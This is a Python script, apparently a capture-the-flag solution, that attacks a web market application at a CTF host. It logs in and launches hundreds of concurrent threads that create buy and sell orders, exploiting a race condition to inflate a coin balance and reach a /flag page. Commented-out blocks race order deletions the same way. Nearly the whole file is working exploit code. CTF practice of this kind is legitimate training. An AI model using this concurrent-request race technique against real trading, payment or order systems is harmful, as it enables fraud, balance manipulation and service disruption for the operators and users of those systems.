from os import wait
import requests
from threading import Thread


#
# after reached 100 coins go to /flag to get the flag

Base_url = "http://mktrace.ctf.offdef.it/"
Login_URL = "http://mktrace.ctf.offdef.it/login"
Market_URL = "http://mktrace.ctf.offdef.it/new_market"
Join_URL = "http://mktrace.ctf.offdef.it/join_market"
New_order_URL = "http://mktrace.ctf.offdef.it/new_order"
Delete_order_URL = "http://mktrace.ctf.offdef.it/delete_order/"

header = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1"
}

def attempLogin(username, password):
    param = {'username': username, 'password': password, 'log_user':''}
    s = requests.Session()
    login = s.post(url=Login_URL, data=param)

    if 'Welcome back!' in login.text:
        return s

def createOrder(session, type):
    param = {'euro': 1, 'coins': 1, 'buy': type}
    res = session.post(url=New_order_URL, data=param)


def deleteOrder(session, order_id):
    session.get(url=Delete_order_URL+str(order_id))

def createNewMarket(session, id):
    param = {'name': 'peppetort6', 'password': 'pepeptort6'}
    res = session.post(url=Market_URL, data=param)
    print(res.text)

def joinMarket(session, id):
    param = {'name': 'peppetort3', 'password': 'peppetort3'}
    res = session.post(url=Join_URL, data=param)
    print(res.text)


def create_sell_orders():
    s = attempLogin('peppetort001', 'peppetort001')
    createOrder(s, 'sell')

def attack(username, password, type):
    s1 = attempLogin(username, password)
    while True:
        createOrder(s1, type)

for _ in range(100):
    l1 = Thread(target=attack, args=('peppetort001', 'peppetort001', 'buy'))
    l2 = Thread(target=attack, args=('peppetort001', 'peppetort001', 'sell'))
    l1.start()
    l2.start()

""" s2 = attempLogin('peppetort002', 'peppetort002')
s3 = attempLogin('peppetort003', 'peppetort003')
for _ in range(100):
    l1 = Thread(target=attack, args=(s2, 'buy'))
    l2 = Thread(target=attack, args=(s3, 'buy'))
    l1.start()
    l2.start() """


""" s = attempLogin('peppetort01', 'peppetort01')
for _ in range(100):
    l1 = Thread(target=createOrder, args=(s, 'buy'))
    l1.start()

res = s.get(url=Base_url+'market')
res.text """



"""     l1 = Thread(target=deleteOrder, args=(s, 1))
    l2 = Thread(target=deleteOrder, args=(s, 1))
    l3 = Thread(target=deleteOrder, args=(s, 1))
    l4 = Thread(target=deleteOrder, args=(s, 1))
    l5 = Thread(target=deleteOrder, args=(s, 1))
    l6 = Thread(target=deleteOrder, args=(s, 1))
    l7 = Thread(target=deleteOrder, args=(s, 1))
    l8 = Thread(target=deleteOrder, args=(s, 1))
    l9 = Thread(target=deleteOrder, args=(s, 1))
    l10 = Thread(target=deleteOrder, args=(s, 1))
    l11 = Thread(target=deleteOrder, args=(s, 1))
    l12 = Thread(target=deleteOrder, args=(s, 1))
    l1.start()
    l2.start()
    l3.start()
    l4.start()
    l5.start()
    l6.start()
    l7.start()
    l8.start()
    l9.start()
    l10.start()
    l11.start()
    l12.start() """